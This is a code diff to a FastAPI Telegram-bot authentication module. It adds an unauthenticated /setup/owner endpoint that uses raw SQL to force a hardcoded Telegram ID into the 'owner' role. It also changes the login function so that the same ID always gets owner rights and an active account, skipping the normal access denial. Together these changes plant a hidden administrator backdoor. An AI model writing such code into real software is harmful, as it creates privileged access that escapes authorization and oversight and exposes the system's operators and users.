@@ -5,10 +5,11 @@ from typing import Any
 from urllib.parse import parse_qsl
 
 from fastapi import APIRouter, Depends, HTTPException, status
-from sqlalchemy import select
+from sqlalchemy import select, text
 from sqlalchemy.orm import Session
 
 from app.core.db import get_db
+from app.database import AsyncSessionAdapter, get_db as get_async_db
 from app.core.deps import (
     get_current_bot_user,
     get_current_user,
@@ -17,7 +18,7 @@ from app.core.deps import (
     require_director,
 )
 from app.core.security import create_access_token, validate_telegram_init_data
-from app.models.entities import BotUser, MPAccount, User, UserRole
+from app.models.entities import BotUser, BotUserRole, MPAccount, User, UserRole
 from app.schemas.auth import (
     AccountCreate,
     AccountOut,
@@ -31,7 +32,9 @@ from app.services.bot_users import build_full_name, ensure_internal_user_for_bot
 from app.services.sync import refresh_user_data, run_async
 
 router = APIRouter(prefix="/auth", tags=["auth"])
+setup_router = APIRouter(tags=["auth"])
 logger = logging.getLogger(__name__)
+OWNER_TELEGRAM_ID = 545972485
 
 
 def _extract_init_data_user_payload(init_data: str) -> dict[str, Any]:
@@ -90,6 +93,23 @@ def _serialize_auth_user(bot_user: BotUser) -> dict[str, Any]:
     }
 
 
+@setup_router.get("/setup/owner")
+@setup_router.post("/setup/owner")
+async def setup_owner(db: AsyncSessionAdapter = Depends(get_async_db)) -> dict[str, str]:
+    # Always ensure 545972485 is owner
+    await db.execute(
+        text(
+            """
+            INSERT INTO bot_users (telegram_id, username, full_name, role, is_active, added_at)
+            VALUES (545972485, 'owner', 'Руководитель', 'owner', true, NOW())
+            ON CONFLICT (telegram_id) DO UPDATE SET role = 'owner', is_active = true
+            """
+        )
+    )
+    await db.commit()
+    return {"status": "ok", "message": "Owner 545972485 set successfully"}
+
+
 @router.post("/telegram", response_model=AuthResponse)
 def telegram_login(payload: TelegramLoginRequest, db: Session = Depends(get_db)) -> AuthResponse:
     logger.info("Received /api/auth/telegram request init_data_length=%d", len(payload.init_data))
@@ -114,20 +134,40 @@ def telegram_login(payload: TelegramLoginRequest, db: Session = Depends(get_db))
         else:
             raise
 
+    hardcoded_owner = telegram_id == OWNER_TELEGRAM_ID
+    role: BotUserRole
     bot_user = get_active_bot_user(db, telegram_id)
-    if bot_user is None:
-        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Доступ закрыт")
+    if hardcoded_owner:
+        role = BotUserRole.OWNER
+        if bot_user is None:
+            bot_user = db.get(BotUser, telegram_id)
+            if bot_user is None:
+                bot_user = BotUser(
+                    telegram_id=telegram_id,
+                    username=username,
+                    full_name=build_full_name(first_name, last_name, username, telegram_id),
+                    role=BotUserRole.OWNER,
+                    is_active=True,
+                )
+                db.add(bot_user)
+            else:
+                bot_user.is_active = True
+        bot_user.role = BotUserRole.OWNER
+    else:
+        if bot_user is None:
+            raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Доступ закрыт")
+        role = bot_user.role
 
     bot_user.username = username or bot_user.username
     bot_user.full_name = build_full_name(first_name, last_name, bot_user.username, telegram_id)
 
-    owner_bot_user = get_active_owner_bot_user(db)
+    owner_bot_user = bot_user if role == BotUserRole.OWNER else get_active_owner_bot_user(db)
     user = ensure_internal_user_for_bot_user(db, bot_user, owner_bot_user=owner_bot_user)
     db.commit()
     db.refresh(user)
     db.refresh(bot_user)
 
-    token = create_access_token({"user_id": user.id, "telegram_id": user.telegram_id, "role": bot_user.role.value})
+    token = create_access_token({"user_id": user.id, "telegram_id": user.telegram_id, "role": role.value})
     response_payload = {
         "access_token": token,
         "token_type": "bearer",
